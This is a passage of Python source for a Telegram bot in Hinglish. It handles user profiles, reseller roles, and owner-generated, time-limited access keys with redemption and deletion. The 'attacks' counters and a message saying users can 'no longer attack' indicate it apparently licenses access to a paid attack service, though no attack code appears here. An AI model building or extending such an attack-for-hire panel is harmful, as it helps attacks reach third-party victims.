        HEALTH["total_errors"] += 1
        print(f"❌ do_status error: {e}")
        traceback.print_exc()

@bot.message_handler(commands=['status'])
def cmd_status(msg):
    react_to_message(msg)
    do_status(msg)

# ============= PROFILE =============
def do_profile(msg):
    try:
        if check_ban(msg): return
        uid = msg.from_user.id
        cid = msg.chat.id

        try: profile_msg = bot.send_message(cid, "👤 ʟᴏᴀᴅɪɴɢ ᴘʀᴏꜰɪʟᴇ...")
        except Exception as e: print(f"Profile send error: {e}"); return

        current_mid = [profile_msg.message_id]

        def build_profile():
            try:
                now = ist_now()
                u = ensure_dict(data.get("users", {})).get(str(uid), {})
                if not isinstance(u, dict): u = {}
                role = "👑 ᴏᴡɴᴇʀ" if is_owner(uid) else ("💼 ʀᴇꜱᴇʟʟᴇʀ" if is_reseller(uid) else "👤 ᴜꜱᴇʀ")
                time_left = time_remaining(uid)
                time_detail = time_remaining_lines(uid)

                expiry_date = "N/A"
                if u.get('key_expiry'):
                    exp = safe_parse_dt(u['key_expiry'])
                    if exp:
                        expiry_date = exp.strftime('%d %b %Y, %I:%M:%S %p')

                joined_full = "N/A"
                if u.get('joined_ist'): joined_full = str(u['joined_ist']) + " IST"
                elif u.get('joined_at'):
                    jt = safe_parse_dt(u['joined_at'])
                    if jt:
                        joined_full = jt.strftime('%d %b %Y, %I:%M:%S %p') + " IST"

                account_age = "N/A"
                if u.get('joined_at'):
                    jt = safe_parse_dt(u['joined_at'])
                    if jt:
                        delta = now - jt
                        total_sec = int(delta.total_seconds())
                        days = total_sec // 86400
                        hrs = (total_sec % 86400) // 3600
                        mins = (total_sec % 3600) // 60
                        secs = total_sec % 60
                        parts = []
                        if days > 0: parts.append(f"{days}ᴅ")
                        if hrs > 0: parts.append(f"{hrs}ʜ")
                        if mins > 0: parts.append(f"{mins}ᴍ")
                        parts.append(f"{secs}ꜱ")
                        account_age = " ".join(parts)

                total_atk = safe_int(u.get('total_attacks', 0))
                username_display = msg.from_user.username or "N/A"
                first_name = msg.from_user.first_name or "User"
                is_active = has_valid_key(uid)
                status_icon = "🟢 ᴀᴄᴛɪᴠᴇ" if is_active else "🔴 ɪɴᴀᴄᴛɪᴠᴇ"

                txt = (
                    "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
                    "▰             🐮 𝕐𝕆𝕌ℝ ℙℝ𝕆𝔽𝕀𝕃𝔼 🐞                ▰\n"
                    "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    "┃              📋 𝗕𝗔𝗦𝗜𝗖 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 🧾            ┃\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    f"  ◆ 🆔 ɪᴅ ➪ <code>{uid}</code>\n"
                    f"  ◆ 📛 ɴᴀᴍᴇ ➪ <b>{escape_html(first_name)}</b>\n"
                    f"  ◆ 🔗 ᴜꜱᴇʀɴᴀᴍᴇ ➪ @{escape_html(username_display)}\n"
                    f"  ◆ 🎭 ʀᴏʟᴇ ➪ {role}\n"
                    f"  ◆ ⚡ ꜱᴛᴀᴛᴜꜱ ➪ {status_icon}\n\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    "┃             ⏰ 𝗧𝗜𝗠𝗘 𝗥𝗘𝗠𝗔𝗜𝗡𝗜𝗡𝗚 ⏲️          ┃\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    f"  ◆ ⏳ ᴛᴏᴛᴀʟ ➪ <b>{time_left}</b>\n"
                    f"{time_detail}\n\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    "┃               📅 𝗝𝗢𝗜𝗡 & 𝗞𝗘𝗬 𝗜𝗡𝗙𝗢 ⌛         ┃\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    f"  ◆ 📥 ᴊᴏɪɴᴇᴅ ➪ <code>{joined_full}</code>\n"
                    f"  ◆ 📆 ᴇxᴘɪʀᴇꜱ ➪ <code>{expiry_date}</code>\n"
                    f"  ◆ 🕐 ᴀᴄᴄᴛ ᴀɢᴇ ➪ <b>{account_age}</b>\n\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    "┃                   📈 𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗖𝗦 🌏              ┃\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    f"  ◆ 💀 ᴀᴛᴛᴀᴄᴋꜱ ➪ <b>{total_atk}</b>\n"
                    f"  ◆ 🕐 ᴄᴜʀʀᴇɴᴛ ➪ <code>{ist_full_str()} IST</code>\n\n"
                )

                if is_active:
                    txt += "╔══════════════════════════╗\n║            ☑️ 𝗦𝗧𝗔𝗧𝗨𝗦 → 𝗔𝗖𝗧𝗜𝗩𝗘 🧑‍💻           ║\n╚══════════════════════════╝"
                else:
                    txt += "╔══════════════════════════╗\n║           ❌ 𝗦𝗧𝗔𝗧𝗨𝗦 → 𝗜𝗡𝗔𝗖𝗧𝗜𝗩𝗘 🫄        ║\n╚══════════════════════════╝"

                return txt
            except Exception as e:
                print(f"Build Profile Error: {e}"); traceback.print_exc()
                return "⚠️ <b>ᴘʀᴏꜰɪʟᴇ ᴛᴇᴍᴘᴏʀᴀʀɪʟʏ ᴜɴᴀᴠᴀɪʟᴀʙʟᴇ</b>"

        r = safe_edit_text(cid, current_mid[0], build_profile(), parse_mode="HTML")
        if r is None:
            try: bot.delete_message(cid, current_mid[0])
            except: pass
            try:
                nm = bot.send_message(cid, build_profile(), parse_mode="HTML")
                current_mid[0] = nm.message_id
            except: return

        def auto_update_profile():
            last_text = None
            start_ts = time.time()
            for _ in range(int(AUTO_STOP_AFTER / UPDATE_INTERVAL) + 5):
                time.sleep(UPDATE_INTERVAL)
                if time.time() - start_ts > AUTO_STOP_AFTER:
                    print(f"⏹️ Profile auto-update stopped after {AUTO_STOP_AFTER}s")
                    try:
                        stopped_text = build_profile() + "\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⏹️ <i>ᴜᴘᴅᴀᴛᴇꜱ ꜱᴛᴏᴘᴘᴇᴅ (2 ᴍɪɴ ʟɪᴍɪᴛ) — ꜰʀᴇꜱʜ ᴘʀᴏꜰɪʟᴇ ᴋᴇ ʟɪʏᴇ /profile ᴅᴏʙᴀʀᴀ ʙʜᴇᴊᴏ</i>"
                        safe_edit_text(cid, current_mid[0], stopped_text, parse_mode="HTML")
                    except: pass
                    break
                try:
                    new_text = build_profile()
                    if new_text != last_text:
                        r = safe_edit_text(cid, current_mid[0], new_text, parse_mode="HTML")
                        if r is None:
                            try: bot.delete_message(cid, current_mid[0])
                            except: pass
                            try:
                                nm = bot.send_message(cid, new_text, parse_mode="HTML")
                                current_mid[0] = nm.message_id
                            except: pass
                        elif r != "NOT_MODIFIED":
                            last_text = new_text
                except Exception as e:
                    print(f"auto_update_profile err: {e}")
                    time.sleep(2)

        threading.Thread(target=auto_update_profile, daemon=True).start()
    except Exception as e:
        HEALTH["total_errors"] += 1
        print(f"❌ do_profile error: {e}")

@bot.message_handler(commands=['profile'])
def cmd_profile(msg):
    react_to_message(msg)
    do_profile(msg)

# ============= KEY SYSTEM =============
def parse_duration(text):
    text = text.lower().strip()
    word_map = {
        "second": 1, "seconds": 1, "sec": 1, "s": 1,
        "minute": 60, "minutes": 60, "min": 60, "m": 60,
        "hour": 3600, "hours": 3600, "hr": 3600, "h": 3600,
        "day": 86400, "days": 86400, "d": 86400,
        "week": 604800, "weeks": 604800, "w": 604800,
        "month": 2592000, "months": 2592000, "mo": 2592000,
        "year": 31536000, "years": 31536000, "y": 31536000,
    }
    m = re.match(r'^(\d+)\s*([a-z]+)$', text)
    if m:
        num = int(m.group(1)); suf = m.group(2)
        if suf in word_map: return num * word_map[suf]
        return None
    if text.isdigit(): return int(text) * 86400
    if text in word_map: return word_map[text]
    return None

def human_readable(seconds):
    if seconds >= 31536000 and seconds % 31536000 == 0: return f"{seconds // 31536000} ʏᴇᴀʀ"
    if seconds >= 2592000 and seconds % 2592000 == 0: return f"{seconds // 2592000} ᴍᴏɴᴛʜ"
    if seconds >= 604800 and seconds % 604800 == 0: return f"{seconds // 604800} ᴡᴇᴇᴋ"
    if seconds >= 86400 and seconds % 86400 == 0: return f"{seconds // 86400} ᴅᴀʏ"
    if seconds >= 3600 and seconds % 3600 == 0: return f"{seconds // 3600} ʜᴏᴜʀ"
    if seconds >= 60 and seconds % 60 == 0: return f"{seconds // 60} ᴍɪɴᴜᴛᴇ"
    return f"{seconds} ꜱᴇᴄᴏɴᴅ"

def do_genkey(msg):
    try:
        if not is_owner(msg.from_user.id): return
        p = msg.text.split()
        if len(p) < 2:
            safe_reply(msg,
                "╔══════════════════════════╗\n"
                "║        🔑 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗞𝗘𝗬 𝗠𝗔𝗞𝗘𝗥 🎛️         ║\n"
                "╚══════════════════════════╝\n\n"
                "  ◆ 📝 <code>/genkey 𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡 [𝗔𝗠𝗢𝗨𝗡𝗧] [𝗡𝗔𝗠𝗘]</code>\n\n"
                "  ◆ ⚡ ꜱᴇᴄ ➪ <code>10s</code>\n"
                "  ◆ ⏱️ ᴍɪɴ ➪ <code>30m</code>\n"
                "  ◆ 🕐 ʜʀ ➪ <code>1h</code>\n"
                "  ◆ 📅 ᴅᴀʏ ➪ <code>1d</code>\n\n"
                "  📌 <b>ᴇxᴀᴍᴘʟᴇꜱ:</b>\n"
                "  <code>/genkey 1d 5</code>\n"
                "  <code>/genkey 1month 10 VIP</code>",
                parse_mode="HTML")
            return

        secs = parse_duration(p[1])
        if not secs or secs < 1:
            safe_reply(msg, "❌ <b>ɪɴᴠᴀʟɪᴅ ᴅᴜʀᴀᴛɪᴏɴ!</b>", parse_mode="HTML"); return

        try:
            amt = int(p[2]) if len(p) > 2 else 1
            custom_name = p[3].upper() if len(p) > 3 else None
        except:
            safe_reply(msg, "❌ <b>ɪɴᴠᴀʟɪᴅ ꜰᴏʀᴍᴀᴛ!</b>", parse_mode="HTML"); return

        keys = []
        for _ in range(amt):
            if custom_name:
                rp = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
                formatted = f"{custom_name}-{rp[:4]}-{rp[4:8]}-{rp[8:12]}"
            else:
                formatted = fmt_key(gen_key(16))
            data["keys"][formatted] = {
                "seconds": secs, "duration_text": human_readable(secs),
                "created_at": ist_now().isoformat(),
                "used": False, "used_by": None
            }
            keys.append(formatted)
        save_data(data)

        dur_text = human_readable(secs)

        # ★★★ KEY DISPLAY WITH COPY BUTTONS ★★★
        for idx, key in enumerate(keys, 1):
            key_text = (
                "╔══════════════════════════╗\n"
                "║               🧟 𝗞𝗘𝗬 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘𝗗 🥡           ║\n"
                "╚══════════════════════════╝\n\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃               💈 𝗞𝗘𝗬 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 🏟️                ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                f"  ◆ 🔢 ɴᴜᴍʙᴇʀ ➪ <b>#{idx}/{amt}</b>\n"
                f"  ◆ ⏰ ᴅᴜʀᴀᴛɪᴏɴ ➪ <code>{dur_text}</code>\n"
                f"  ◆ 🎭 ᴛʏᴘᴇ ➪ <code>{'ᴘʀᴇᴍɪᴜᴍ' if custom_name else 'ꜱᴛᴀɴᴅᴀʀᴅ'}</code>\n\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃                   🦄 𝗬𝗢𝗨𝗥 𝗞𝗘𝗬 🪩                 ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
                f"  <code>{key}</code>\n\n"
                "  ⬆️ <b>ᴋᴇʏ ᴘᴇ ʟᴏɴɢ ᴘʀᴇꜱꜱ ᴋᴀʀᴋᴇ ᴄᴏᴘʏ ᴋᴀʀᴏ</b>\n\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃           📋 𝗛𝗢𝗪 𝗧𝗢 𝗥𝗘𝗗𝗘𝗘𝗠 📋           ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                f"  ➤ <code>/redeem {key}</code>\n\n"
                "╔══════════════════════════╗\n"
                "║     💠 𝗡𝗘𝗫𝗧 𝗞𝗘𝗬 𝗖𝗢𝗣𝗬 𝗔𝗡𝗗 𝗨𝗦𝗘 💠     ║\n"
                "╚══════════════════════════╝"
            )

            # ★ Copy button (alert me key dikhega) ★
            copy_kb = InlineKeyboardMarkup()
            copy_kb.add(
                InlineKeyboardButton("🍓 𝐂𝐎𝐏𝐘 𝐊𝐄𝐘 📋", callback_data=f"copykey_{key}")
            )
            copy_kb.add(
                InlineKeyboardButton("📩 ɴᴇxᴛ ꜱᴛᴇᴘ — ʀᴇᴅᴇᴇᴍ ᴄᴏᴍᴍᴀɴᴅ 🍑", callback_data=f"redeeminfo_{key}")
            )

            safe_reply(msg, key_text, parse_mode="HTML", reply_markup=copy_kb)

    except Exception as e:
        HEALTH["total_errors"] += 1
        print(f"❌ do_genkey error: {e}")
        
@bot.message_handler(commands=['genkey', 'gen'])
def cmd_gen(msg):
    react_to_message(msg)
    do_genkey(msg)
    
# ============= KEY DELETE SYSTEM ★★★ =============
@bot.message_handler(commands=['listkeys'])
def cmd_listkeys(msg):
    react_to_message(msg)
    try:
        if not is_owner(msg.from_user.id): return
        keys = ensure_dict(data.get("keys", {}))
        if not keys:
            safe_reply(msg,
                "╔══════════════════════════╗\n"
                "║                     🗝️ 𝗞𝗘𝗬 𝗟𝗜𝗦𝗧 🗝️                    ║\n"
                "╚══════════════════════════╝\n\n"
                "  📂 <b>ᴋᴏɪ ᴋᴇʏ ɴᴀʜɪ ʜᴀɪ</b>\n\n"
                "  📌 <b>ɢᴇɴᴇʀᴀᴛᴇ ᴋᴀʀɴᴇ ᴋᴇ ʟɪʏᴇ:</b>\n"
                "  ➤ <code>/genkey 1d 5</code>",
                parse_mode="HTML")
            return

        used_count = sum(1 for k, v in keys.items() if isinstance(v, dict) and v.get('used'))
        unused_count = len(keys) - used_count

        txt = (
            "╔══════════════════════════╗\n"
            "║                     🗝️ 𝗞𝗘𝗬 𝗟𝗜𝗦𝗧 🗝️                    ║\n"
            "╚══════════════════════════╝\n\n"
            f"  ◆ 📊 ᴛᴏᴛᴀʟ ➪ <b>{len(keys)}</b>\n"
            f"  ◆ ✅ ᴜꜱᴇᴅ ➪ <b>{used_count}</b>\n"
            f"  ◆ 🆓 ᴀᴠᴀɪʟ ➪ <b>{unused_count}</b>\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃                   📋 𝗔𝗟𝗟 𝗞𝗘𝗬𝗦 📋                  ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        )

        # Saari keys display karo (limit 50)
        for i, (key, info) in enumerate(list(keys.items())[:50], 1):
            if not isinstance(info, dict):
                status = "❓ ᴋɴᴏᴡɴ"
            elif info.get('used'):
                status = f"✅ ᴜꜱᴇᴅ ʙʏ <code>{info.get('used_by','?')}</code>"
            else:
                status = "🆓 ᴀᴠᴀɪʟ"

            dur = info.get('duration_text', 'N/A') if isinstance(info, dict) else 'N/A'
            txt += f"  ◆ <b>{i:02d}.</b> <code>{key}</code>\n"
            txt += f"      ┣ ⏰ {dur}\n"
            txt += f"      ┗ {status}\n\n"

        if len(keys) > 50:
            txt += f"\n  ... ᴀɴᴅ {len(keys) - 50} ᴍᴏʀᴇ ᴋᴇʏꜱ\n"

        txt += (
            "\n┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃          🗑️ 𝗗𝗘𝗟𝗘𝗧𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 🗑️         ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "  ➤ <code>/delkey KEY</code> ➪ ᴇᴋ ᴋᴇʏ ᴅᴇʟᴇᴛᴇ\n"
            "  ➤ <code>/delallkeys</code> ➪ ꜱᴀᴀʀɪ ᴜɴᴜꜱᴇᴅ ᴋᴇʏꜱ ᴅᴇʟᴇᴛᴇ\n"
        )

        # Message lamba ho sakta hai, isliye 2 parts mein bhejo agar zaroorat ho
        if len(txt) > 4000:
            txt = txt[:4000] + "\n\n⚠️ <i>ʟɪꜱᴛ ᴛᴏᴏ ʟᴏɴɢ — ᴋᴜᴄʜ ᴋᴇʏꜱ ʜɪᴅᴅᴇɴ</i>"

        safe_reply(msg, txt, parse_mode="HTML")
    except Exception as e:
        print(f"❌ listkeys error: {e}")
        safe_reply(msg, f"❌ <b>ᴇʀʀᴏʀ:</b> <code>{escape_html(str(e)[:100])}</code>", parse_mode="HTML")

@bot.message_handler(commands=['delkey'])
def cmd_delkey(msg):
    react_to_message(msg)
    try:
        if not is_owner(msg.from_user.id): return
        p = msg.text.split()
        if len(p) < 2:
            safe_reply(msg,
                "╔══════════════════════════╗\n"
                "║            🗑️ 𝗗𝗘𝗟𝗘𝗧𝗘 𝗞𝗘𝗬 🗑️            ║\n"
                "╚══════════════════════════╝\n\n"
                "  📝 <code>/delkey KEY</code>\n\n"
                "  📌 <b>ᴇxᴀᴍᴘʟᴇ:</b>\n"
                "  ➤ <code>/delkey ABC-1234-DEFG-HIJK</code>\n\n"
                "  💡 <b>ᴋᴇʏ ʟɪꜱᴛ ᴅᴇᴋʜɴᴇ ᴋᴇ ʟɪʏᴇ:</b>\n"
                "  ➤ <code>/listkeys</code>",
                parse_mode="HTML")
            return

        key = p[1].strip().upper()
        keys = ensure_dict(data.get("keys", {}))

        if key not in keys:
            safe_reply(msg,
                "╔══════════════════════════╗\n"
                "║               ❌ 𝗞𝗘𝗬 𝗡𝗢𝗧 𝗙𝗢𝗨𝗡𝗗 ❌            ║\n"
                "╚══════════════════════════╝\n\n"
                f"  ◆ 🔑 ᴋᴇʏ ➪ <code>{escape_html(key)}</code>\n\n"
                "  ⚠️ <b>ʏᴇʜ ᴋᴇʏ ᴅᴀᴛᴀʙᴀꜱᴇ ᴍᴇ ɴᴀʜɪ ʜᴀɪ!</b>\n\n"
                "  💡 <code>/listkeys</code> ꜱᴇ ᴄʜᴇᴄᴋ ᴋᴀʀᴏ",
                parse_mode="HTML")
            return

        # Delete key
        key_info = keys.pop(key)
        save_data(data)

        # Agar yeh key kisi user ne use ki hai toh user ka key bhi hata do
        used_by = key_info.get('used_by') if isinstance(key_info, dict) else None
        user_cleared = False
        if used_by:
            uid_str = str(used_by)
            if uid_str in ensure_dict(data.get("users", {})):
                # User ka key_expiry check karo
                if isinstance(data["users"][uid_str], dict):
                    data["users"][uid_str]["key_expiry"] = None
                    data["users"][uid_str]["key_activated"] = None
                    user_cleared = True
                    save_data(data)
                # ★ NAYA — User ko notify + keyboard remove ★
                try:
                    bot.send_message(
                        int(uid_str),
                        "🔒 ᴋᴇʏ ᴅᴇʟᴇᴛᴇᴅ — ᴋᴇʏʙᴏᴀʀᴅ ʀᴇᴍᴏᴠᴇᴅ",
                        reply_markup=ReplyKeyboardRemove()
                    )
                    bot.send_message(
                        int(uid_str),
                        "╔══════════════════════════╗\n"
                        "║                   🗑️ 𝗞𝗘𝗬 𝗗𝗘𝗟𝗘𝗧𝗘𝗗 🗑️             ║\n"
                        "╚══════════════════════════╝\n\n"
                        "🔒 <b>ᴀᴀᴘᴋɪ ᴋᴇʏ ᴅᴇʟᴇᴛᴇ ᴋᴀʀ ᴅɪ ɢᴀʏɪ ʜᴀɪ</b>\n\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        "⚠️ <b>ᴀᴀᴘ ᴀʙ ᴀᴛᴛᴀᴄᴋ ɴᴀʜɪ ᴋᴀʀ ꜱᴀᴋᴛᴇ</b>\n\n"
                        "📌 <b>ɴᴀʏᴀ ᴋᴇʏ ʀᴇᴅᴇᴇᴍ ᴋᴀʀᴏ:</b>\n"
                        "➤ <code>/redeem YOUR-KEY</code>\n\n"
                        f"👑 <b>ᴏᴡɴᴇʀ:</b> <code>{BOT_OWNER}</code>",
                        parse_mode="HTML"
                    )
                    print(f"🗑️ Key deleted for {uid_str} — Keyboard removed")
                except Exception as notify_err:
                    print(f"⚠️ Key delete notify failed {uid_str}: {notify_err}")

        msg_text = (
            "╔══════════════════════════╗\n"
            "║                 ✅ 𝗞𝗘𝗬 𝗗𝗘𝗟𝗘𝗧𝗘𝗗 ✅               ║\n"
            "╚══════════════════════════╝\n\n"
            f"  ◆ 🗑️ ᴋᴇʏ ➪ <code>{escape_html(key)}</code>\n"
            f"  ◆ ⏰ ᴅᴜʀᴀᴛɪᴏɴ ➪ <b>{key_info.get('duration_text','N/A') if isinstance(key_info, dict) else 'N/A'}</b>\n"
            f"  ◆ 📊 ʀᴇᴍᴀɪɴɪɴɢ ➪ <b>{len(keys)}</b>\n"
        )

        if user_cleared:
            msg_text += f"\n  ⚠️ <b>ᴜꜱᴇʀ <code>{used_by}</code> ᴋᴀ ᴋᴇʏ ᴀᴄᴄᴇꜱꜱ ʙʜɪ ʀᴇᴠᴏᴋᴇ ᴋᴀʀ ᴅɪʏᴀ</b>"

        msg_text += "\n\n╔══════════════════════════╗\n║             🗑️ ᴋᴇʏ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ɢᴏɴᴇ          ║\n╚══════════════════════════╝"

        safe_reply(msg, msg_text, parse_mode="HTML")
    except Exception as e:
        print(f"❌ delkey error: {e}")
        safe_reply(msg, f"❌ <b>ᴇʀʀᴏʀ:</b> <code>{escape_html(str(e)[:100])}</code>", parse_mode="HTML")

@bot.message_handler(commands=['delallkeys'])
def cmd_delallkeys(msg):
    react_to_message(msg)
    try:
        if not is_owner(msg.from_user.id): return
        p = msg.text.split()
        # Confirmation required
        if len(p) < 2 or p[1].lower() != "confirm":
            keys = ensure_dict(data.get("keys", {}))
            unused = sum(1 for k, v in keys.items() if isinstance(v, dict) and not v.get('used'))
            used = len(keys) - unused

            safe_reply(msg,
                "╔══════════════════════════╗\n"
                "║              ⚠️ 𝗗𝗘𝗟𝗘𝗧𝗘 𝗔𝗟𝗟 𝗞𝗘𝗬𝗦 ⚠️          ║\n"
                "╚══════════════════════════╝\n\n"
                f"  ◆ 📊 ᴛᴏᴛᴀʟ ᴋᴇʏꜱ ➪ <b>{len(keys)}</b>\n"
                f"  ◆ 🆓 ᴜɴᴜꜱᴇᴅ ➪ <b>{unused}</b>\n"
                f"  ◆ ✅ ᴜꜱᴇᴅ ➪ <b>{used}</b>\n\n"
                "  ⚠️ <b>ʏᴇʜ ꜱɪʀꜰ ᴜɴᴜꜱᴇᴅ ᴋᴇʏꜱ ᴅᴇʟᴇᴛᴇ ᴋᴀʀᴇɢᴀ</b>\n"
                "  ⚠️ <b>ᴜꜱᴇᴅ ᴋᴇʏꜱ ꜱᴀꜰᴇ ʀᴀʜᴇɴɢɪ</b>\n\n"
                "  🔴 <b>ᴄᴏɴꜰɪʀᴍ ᴋᴀʀɴᴇ ᴋᴇ ʟɪʏᴇ:</b>\n"
                "  ➤ <code>/delallkeys confirm</code>",
                parse_mode="HTML")
            return

        # Confirmed — delete all UNUSED keys
        keys = ensure_dict(data.get("keys", {}))
        to_delete = [k for k, v in keys.items() if isinstance(v, dict) and not v.get('used')]
        deleted_count = 0
        # ★ NAYA — Affected users collect karo ★
        affected_users = []
        for k in to_delete:
            key_info = keys.get(k)
            if isinstance(key_info, dict):
                used_by = key_info.get('used_by')
                if used_by and str(used_by) not in affected_users:
                    affected_users.append(str(used_by))
            keys.pop(k, None)
            deleted_count += 1
        save_data(data)
        # ★ NAYA — Affected users ko notify + keyboard remove ★
        for uid_str in affected_users:
            try:
                bot.send_message(
                    int(uid_str),
                    "🔒 ᴋᴇʏ ᴅᴇʟᴇᴛᴇᴅ — ᴋᴇʏʙᴏᴀʀᴅ ʀᴇᴍᴏᴠᴇᴅ",
                    reply_markup=ReplyKeyboardRemove()
                )
                bot.send_message(
                    int(uid_str),
                    "╔══════════════════════════╗\n"
                    "║              🗑️ 𝗞𝗘𝗬 𝗗𝗘𝗟𝗘𝗧𝗘𝗗 🗑️             ║\n"
                    "╚══════════════════════════╝\n\n"
                    "🔒 <b>ᴀᴀᴘᴋɪ ᴋᴇʏ ᴅᴇʟᴇᴛᴇ ᴋᴀʀ ᴅɪ ɢᴀʏɪ ʜᴀɪ</b>\n\n"
                    "📌 <b>ɴᴀʏᴀ ᴋᴇʏ ʀᴇᴅᴇᴇᴍ ᴋᴀʀᴏ:</b>\n"
                    "➤ <code>/redeem YOUR-KEY</code>\n\n"
                    f"👑 <b>ᴏᴡɴᴇʀ:</b> <code>{BOT_OWNER}</code>",
                    parse_mode="HTML"
                )
                print(f"🗑️ Key deleted for {uid_str} — Keyboard removed")
            except Exception as notify_err:
                print(f"⚠️ Key delete notify failed {uid_str}: {notify_err}")

        safe_reply(msg,
            "╔══════════════════════════╗\n"
            "║            ✅ 𝗔𝗟𝗟 𝗞𝗘𝗬𝗦 𝗗𝗘𝗟𝗘𝗧𝗘𝗗 ✅         ║\n"
            "╚══════════════════════════╝\n\n"
            f"  ◆ 🗑️ ᴅᴇʟᴇᴛᴇᴅ ➪ <b>{deleted_count}</b> ᴜɴᴜꜱᴇᴅ ᴋᴇʏꜱ\n"
            f"  ◆ 📊 ʀᴇᴍᴀɪɴɪɴɢ ➪ <b>{len(keys)}</b>\n\n"
            "  ✅ <b>ᴜꜱᴇᴅ ᴋᴇʏꜱ ꜱᴀꜰᴇ ʜᴀɪɴ</b>",
            parse_mode="HTML")
    except Exception as e:
        print(f"❌ delallkeys error: {e}")
        safe_reply(msg, f"❌ <b>ᴇʀʀᴏʀ:</b> <code>{escape_html(str(e)[:100])}</code>", parse_mode="HTML")

@bot.message_handler(commands=['redeem'])
def cmd_redeem(msg):
    react_to_message(msg)
    try:
        if check_ban(msg): return
        uid = msg.from_user.id
        p = msg.text.split()
        if len(p) < 2:
            safe_reply(msg,
                "╔══════════════════════════╗\n"
                "║                 🫧 𝗥𝗘𝗗𝗘𝗘𝗠 𝗞𝗘𝗬 🍑                ║\n"
                "╚══════════════════════════╝\n\n"
                "  📝 <code>/redeem Yᴀᴀɴ KᴇY DᴀL LᴀUᴅE</code>",
                parse_mode="HTML"); return
        key = p[1].strip().upper()
        if key not in ensure_dict(data.get("keys", {})):
            safe_reply(msg,
                "╔══════════════════════════╗\n"
                "║                  ❌ 𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗞𝗘𝗬 ❌                ║\n"
                "╚══════════════════════════╝\n\n"
                "  ⚠️ <b>ʏᴇʜ ᴋᴇʏ ᴠᴀʟɪᴅ ɴᴀʜɪ ʜᴀɪ ʏᴀ ɢᴀʟᴀᴛ ʜᴀɪ!</b>\n\n"
                f"  ◆ 🔑 ᴋᴇʏ ➪ <code>{escape_html(key)}</code>\n\n"
                "  ◆ 📌 <b>ᴄʜᴇᴄᴋ ᴋᴀʀᴏ:</b>\n"
                "  ◆ ➤ ᴋᴇʏ ꜱᴀʜɪ ʜᴀɪ?\n"
                "  ◆ ➤ ᴋᴇʏ ᴍᴇ ꜱᴘᴀᴄᴇ ɴᴀʜɪ?\n\n"
                "  📩 ɴᴀʏᴀ ᴋᴇʏ ʟᴇɴᴇ ᴋᴇ ʟɪʏᴇ ᴏᴡɴᴇʀ ꜱᴇ ᴄᴏɴᴛᴀᴄᴛ ᴋᴀʀᴏ.",
                parse_mode="HTML", reply_markup=dev_btn_kb()); return
        kinfo = data["keys"][key]
        if not isinstance(kinfo, dict):
            safe_reply(msg, "❌ <b>ᴋᴇʏ ᴅᴀᴛᴀ ᴋᴏʀʀᴜᴘᴛ!</b>", parse_mode="HTML"); return
        if kinfo.get("used"):
            safe_reply(msg,
                "╔══════════════════════════╗\n"
                "║            🧌 𝗞𝗘𝗬 𝗔𝗟𝗥𝗘𝗔𝗗𝗬 𝗨𝗦𝗘𝗗 🕵️        ║\n"
                "╚══════════════════════════╝\n\n"
                "  🔒 <b>ʏᴇʜ ᴋᴇʏ ᴘᴇʜʟᴇ ʜɪ ᴜꜱᴇ ʜᴏ ᴄʜᴜᴋɪ ʜᴀɪ!</b>\n\n"
                f"  ◆ 👤 ᴜꜱᴇᴅ ʙʏ ➪ <code>{kinfo.get('used_by', 'N/A')}</code>",
                parse_mode="HTML"); return

        secs = safe_int(kinfo.get("seconds", 86400), 86400)
        expiry = ist_now() + timedelta(seconds=secs)
        data["users"].setdefault(str(uid), {})
        existing = data["users"][str(uid)].get("key_expiry")
        if existing:
            old_exp = safe_parse_dt(existing)
            if old_exp and old_exp > ist_now():
                expiry = old_exp + timedelta(seconds=secs)
        data["users"][str(uid)]["key_expiry"] = expiry.isoformat()
        data["users"][str(uid)]["key_activated"] = ist_now().isoformat()
        data["users"][str(uid)]["username"] = msg.from_user.username or msg.from_user.first_name
        kinfo["used"] = True; kinfo["used_by"] = uid
        kinfo["used_at"] = ist_now().isoformat()
        save_data(data)

        if str(uid) in _expiry_notified: del _expiry_notified[str(uid)]
        expiry_ist = expiry.strftime('%d %b %Y, %I:%M:%S %p')

        safe_reply(msg,
            "╔══════════════════════════╗\n"
            "║              🍇 𝗞𝗘𝗬 𝗥𝗘𝗗𝗘𝗘𝗠𝗘𝗗 🥡              ║\n"
            "╚══════════════════════════╝\n\n"
